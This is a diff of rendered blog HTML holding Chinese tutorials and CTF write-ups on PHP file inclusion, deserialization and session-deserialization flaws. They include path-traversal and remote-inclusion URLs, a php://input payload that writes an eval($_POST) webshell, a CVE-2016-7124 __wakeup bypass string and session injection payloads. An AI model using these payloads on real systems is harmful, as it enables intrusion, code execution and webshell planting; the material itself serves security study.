+<li>点号截断：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………[…]…………</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p>这里需要一个服务器(我这里不放出真正的ip)<br><br>在远程服务器xxx.xxx.x.xx上传一个1.php文件，内容为hello.<br><br>构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=http://xxx.xxx.x.xx/1.php</span><br></pre></td></tr></table></figure></p>
+<p>可以看到页面输出hello</p>
+<h3 id="本地文件包含的利用技巧"><a href="#本地文件包含的利用技巧" class="headerlink" title="本地文件包含的利用技巧"></a>本地文件包含的利用技巧</h3><p>远程文件包含漏洞之所以能够执行命令，就是因为攻击者能够自定义被包含的文件内容，本地文件包含相反<br><br>因此本地文件包含漏洞想要执行命令，也需要找到一个攻击者能够控制内容的本地文件。</p>
+<h3 id="【CTF题】使用文件包含漏洞读取网页代码"><a href="#【CTF题】使用文件包含漏洞读取网页代码" class="headerlink" title="【CTF题】使用文件包含漏洞读取网页代码"></a>【CTF题】使用文件包含漏洞读取网页代码</h3><ul>
+<li>1.通过PHP内置协议直接读取代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>能获得xxx.php的代码的base64加密结果，通过base64解密后便可获得xxx.php的代码</p>
+<ul>
+<li>2.写入php文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php?file=php://input</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>且在http头里提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_post[&apos;xxx&apos;];?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就会在index.php说在的目录下生成shell.php</p>
+<ul>
+<li>3.直接包含内有运行代码的文件</li>
+</ul>
+<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include $_GET[&apos;file&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>那么就可以通过抓包修改file值的办法去运行一些本来不该运行的文件</p>
+<p>也可以通过此方法直接输出一些敏感的配置文件和远程包含shell（需要目标主机开启allow_url_fopen)</p>
+<p><a href="https://blog.csdn.net/wangjian1012/article/details/51581440" target="_blank" rel="noopener">https://blog.csdn.net/wangjian1012/article/details/51581440</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP反序列化/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP反序列化/">PHP反序列化漏洞绕过</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>一个挺不错的链接:<a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6835592.html</a></p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><h3 id="序列化与反序列化简介"><a href="#序列化与反序列化简介" class="headerlink" title="序列化与反序列化简介"></a>序列化与反序列化简介</h3><p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize()</p>
+<p>反序列化:恢复原先被序列化的变量 函数: unserialize()</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在本地搭建PHP环境,测试序列化和反序列化这两个函数的原理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;hello world&quot;;</span><br><span class="line">$b = array(&quot;hello&quot;,&quot;world&quot;);</span><br><span class="line">$c = 12345678;</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo serialize($b);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo serialize($c); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>输出为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s:11:&quot;hello world&quot;; // 序列化字符串</span><br><span class="line">a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:5:&quot;world&quot;;&#125; 序列化数组</span><br><span class="line">i:12345678;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hello&#123;</span><br><span class="line">	public $d = &quot;hello,world&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new hello();</span><br><span class="line">echo serialize($test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;hello&quot;:1:&#123;s:1:&quot;d&quot;;s:11:&quot;hello,world&quot;;&#125;//序列化对象  首字母代表参数类型 O-&gt;Objext S-&gt;String...</span><br></pre></td></tr></table></figure></p>
+<p>PHP 对不同类型的数据用不同的字母进行标示，Yahoo 开发网站提供的Using Serialized PHP with<br>Yahoo! Web Services 一文中给出所有的字母标示及其含义：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array 数组</span><br><span class="line">b - boolean 布尔</span><br><span class="line">d - double</span><br><span class="line">i - integer 整数</span><br><span class="line">o - common object 对象</span><br><span class="line">r - reference</span><br><span class="line">s - string 字符串</span><br><span class="line">C - custom object 自定义对象</span><br><span class="line">O - class 类</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure></p>
+<p>具体讲解见如链接 <a href="https://blog.csdn.net/iamduoluo/article/details/8491746" target="_blank" rel="noopener">https://blog.csdn.net/iamduoluo/article/details/8491746</a></p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a></h2><p><strong>construct()， </strong>destruct()， <strong>call()， </strong>callStatic()， <strong>get()， </strong>set()， <strong>isset()， </strong>unset()，<br><strong>sleep()， </strong>wakeup()， <strong>toString()， </strong>invoke()， <strong>set_state()， </strong>clone() 和 __debugInfo() 等方法在 PHP 中被称为”魔术方法”（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。</span><br></pre></td></tr></table></figure></p>
+<h2 id="序列化public-private-protect参数产生不同结果"><a href="#序列化public-private-protect参数产生不同结果" class="headerlink" title="序列化public private protect参数产生不同结果"></a>序列化public private protect参数产生不同结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    private $test1=&quot;hello&quot;;</span><br><span class="line">    public $test2=&quot;hello&quot;;</span><br><span class="line">    protected $test3=&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new test();</span><br><span class="line">echo serialize($test);  //  O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>test类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同 O:4:”test”:3:{s:11:” test test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:” * test3”;s:5:”hello”;}</p>
+<p>通过对网页抓取输出是这样的 O:4:”test”:3:{s:11:”\00test\00test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:”\00*\00test3”;s:5:”hello”;}</p>
+<p>private的参数被反序列化后变成 \00test\00test1 public的参数变成 test2   protected的参数变成 \00*\00test3 </p>
+<h2 id="CTF比赛题目分析"><a href="#CTF比赛题目分析" class="headerlink" title="CTF比赛题目分析"></a>CTF比赛题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0); </span><br><span class="line">    class sercet&#123; </span><br><span class="line">        private $file=&apos;index.php&apos;; </span><br><span class="line">         </span><br><span class="line">        public function __construct($file)&#123; </span><br><span class="line">            $this-&gt;file=$file; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        function __destruct()&#123; </span><br><span class="line">            echo show_source($this-&gt;file,true); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        function __wakeup()&#123; </span><br><span class="line">		$this-&gt;file=&apos;index.php&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">    $cmd=cmd00; </span><br><span class="line">    if (!isset($_GET[$cmd]))&#123; </span><br><span class="line">        echo show_source(&apos;index.php&apos;,true); </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        $cmd=base64_decode($_GET[$cmd]); </span><br><span class="line">        if ((preg_match(&apos;/[oc]:\d+:/i&apos;,$cmd))||(preg_match(&apos;/flag/i&apos;,$cmd)))&#123; </span><br><span class="line">            echo &quot;Are u gaoshing?&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else&#123; </span><br><span class="line">            unserialize($cmd); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br><span class="line">//sercet in the_next.php</span><br></pre></td></tr></table></figure>
+<p> 大致思路 首先是一个类sercet 接受$cmd，绕过正则 ，反序列化。覆盖$file的值，绕过 __wakeup，显示the_next.php的源码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class sercet&#123; </span><br><span class="line">        private $file=&apos;index.php&apos;; </span><br><span class="line">         </span><br><span class="line">        public function __construct($file)&#123; </span><br><span class="line">            $this-&gt;file=$file; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        function __destruct()&#123; </span><br><span class="line">            echo show_source($this-&gt;file,true); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        function __wakeup()&#123; </span><br><span class="line">            $this-&gt;file=&apos;index.php&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    $test = new sercet(&quot;the_next.php&quot;);</span><br><span class="line">    echo serialize($test);  // O:6:&quot;sercet&quot;:1:&#123;s:12:&quot; sercet file&quot;;s:12:&quot;the_next.php&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> 绕过正则可以用+号 问题是如何绕过__weakup 百度一下  发现这是一个CVE漏洞 ==》当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>
+<p> O:6:”sercet”:1:  也就是输入比1大的值就行   如O:6:”sercet”:2:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+6:&quot;sercet&quot;:1:&#123;s:12:&quot; sercet file&quot;;s:12:&quot;the_next.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-php" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/php/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/php/">PHP基础知识</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="0x01-Http-Header里的Content-Type"><a href="#0x01-Http-Header里的Content-Type" class="headerlink" title="0x01 Http Header里的Content-Type"></a>0x01 Http Header里的Content-Type</h3><p>Http Header里的Content-Type一般有这三种:<br></p>
+<ul>
+<li>application/x-www-form-urlencoded：数据被编码为名称/值对。这是标准的编码格式。</li>
+<li>multipart/form-data： 数据被编码为一条消息，页上的每个控件对应消息中的一个部分。</li>
+<li>text/plain： 数据以纯文本形式(text/json/xml/html)进行编码，其中不含任何控件或格式字符。postman软件里标的是RAW。<br>当action为get时候，浏览器用x-www-form-urlencoded的编码方式把form数据转换成一个字串（name1=value1&amp;name2=value2…），然后把这个字串追加到url后面，用?分割，加载这个新的url。</li>
+</ul>
+<p>当action为post时候，浏览器把form数据封装到http body中，然后发送到server。 如果没有type=file的控件，用默认的application/x-www-form-urlencoded就可以了。 但是如果有type=file的话，就要用到multipart/form-data了。</p>
+<p>当action为post且Content-Type类型是multipart/form-data，浏览器会把整个表单以控件为单位分割，并为每个部分加上Content-Disposition(form-data或者file),Content-Type(默认为text/plain),name(控件name)等信息，并加上分割符(boundary)。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP中SESSION反序列化机制" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP中SESSION反序列化机制/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP中SESSION反序列化机制/">PHP之SESSION反序列化机制</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>参考链接:<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>php.ini中有个配置项如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure></p>
+<p>在php语法如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;xxxxx&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>这里的xxxxx有三种不同的引擎,不同的引擎所对应的session的存储方式不相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary: 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php: 键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-简单用法"><a href="#0x02-简单用法" class="headerlink" title="0x02 简单用法"></a>0x02 简单用法</h2><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class syclover&#123;</span><br><span class="line">        var $func=&quot;&quot;;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;func = &quot;phpinfo()&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        function __wakeup()&#123;</span><br><span class="line">            eval($this-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&apos;a&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问localhost/test.php?a=O:8:”syclover”:1:{s:4:”func”;s:14:”echo “spoock”;”;}。那么反序列化得到的内容是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">object(syclover)[1]</span><br><span class="line">  public &apos;func&apos; =&gt; string &apos;echo &quot;spoock&quot;;&apos; (length=14)</span><br></pre></td></tr></table></figure>
+<p>同时页面输出spoock，说明成功执行了echo的命令，这只是一个简单的序列化啊漏洞例子</p>
+<h2 id="PHP-Session-序列化不当的利用"><a href="#PHP-Session-序列化不当的利用" class="headerlink" title="PHP Session 序列化不当的利用"></a>PHP Session 序列化不当的利用</h2><p>HP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;ryat&apos;] = &apos;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&apos;;</span><br></pre></td></tr></table></figure>
+<p>这里$_SESSION的数据使用php_serialize，那么最后的存储的内容就是a:1:{s:6:”spoock”;s:24:”|O:11:”PeopleClass”:0:{}”;}。<br>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array (size=1)</span><br><span class="line">  &apos;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&apos; =&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[1]</span><br><span class="line">      public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;PeopleClass&apos; (length=11)</span><br></pre></td></tr></table></figure>
+<p>这是因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将a:1:{s:6:”spoock”;s:24:”作为SESSION的key，将O:11:”PeopleClass”:0:{}作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br>这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<h2 id="实际用法"><a href="#实际用法" class="headerlink" title="实际用法"></a>实际用法</h2><p>这里假设1.php,2.php两个文件，每个文件所使用的SESSION的引擎不一样，这样就会产生一个漏洞</p>
+<p>1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure></p>
+<p>2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>访问1.php,构造如下payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后’php_serialize’将会设置session对话并且值为a:1:{s:6:”spoock”;s:48:”|O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}”;}</p>
+<p>访问2.php</p>
+<p>这一步将会利用解析session对话的值，以|为分割符将session分割为键名和值两部分<br>键名：a:1:{s:6:”spoock”;s:48:”<br>值O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}”;}<br>从而解析出了序列化，自动生成了lemon的类，当类在结尾销毁时将会调用析构函数执行恶意代码</p>
+<h2 id="CTF一道题"><a href="#CTF一道题" class="headerlink" title="CTF一道题"></a>CTF一道题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br></pre></td></tr></table></figure>
+<p>很明显的PHP Session 反序列化漏洞</p>
+<p>根据代码的?phpinfo我们可以看到 <br></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/KE%25~M1ME~CU%281$~HX_G2%29HA.png" alt="image"></p>
+<ul>
+<li><p>首先第一行的session.serialize_handler默认为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
+</li>
+<li><p>第三行的ession.upload_progress.enabled为On<br><img src="http://p1vrkwaxt.bkt.clouddn.com/XTM%25ICEV1TL4W2P1_3I%7D_9O.png" alt="image"></p>
+</li>
+</ul>
+<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
+<p>但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。</p>
+<p>其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题</p>
+<p>思路很明显了，我们需要构造一个上传和post同时进行的情况，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;sdas&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
